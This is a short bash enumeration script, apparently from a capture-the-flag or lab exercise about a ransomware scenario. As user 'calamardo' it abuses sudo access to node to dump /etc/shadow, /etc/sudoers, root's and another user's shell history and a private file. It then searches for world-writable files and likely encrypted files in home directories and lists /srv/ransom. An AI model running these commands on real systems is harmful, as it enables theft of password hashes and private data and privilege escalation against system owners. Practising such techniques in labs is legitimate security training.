set +e
echo LBL_node_read_root
sudo -u calamardo /bin/node -e 'const fs=require("fs");for(const f of ["/etc/shadow","/etc/sudoers","/root/.bash_history","/home/patricio/.bash_history","/home/patricio/private.txt"]){try{console.log("READ "+f+":\n"+fs.readFileSync(f,"utf8"))}catch(e){console.log("NOREAD "+f+": "+e.message)}}'
echo LBL_world_writable
find / -perm -0002 -type f 2>/dev/null | grep -vE '^/(proc|sys)/' | head -20
echo LBL_encrypted_files_search
# buscar archivos de tamano multimplo de 16 con contenido no-texto en homes
for u in bob calamardo patricio; do find /home/$u -type f 2>/dev/null -exec sh -c 'f="$1"; sz=$(stat -c%s "$f"); if [ "$((sz%16))" = "0" ] && [ "$sz" -gt 0 ]; then if ! file "$f" | grep -qiE "text|ASCII|UTF-8|empty"; then echo "CAND "$f" "$sz" bytes"; fi; fi' _ {} \;; done
echo LBL_srv_ransom_listing
ls -la /srv/ransom
echo DONE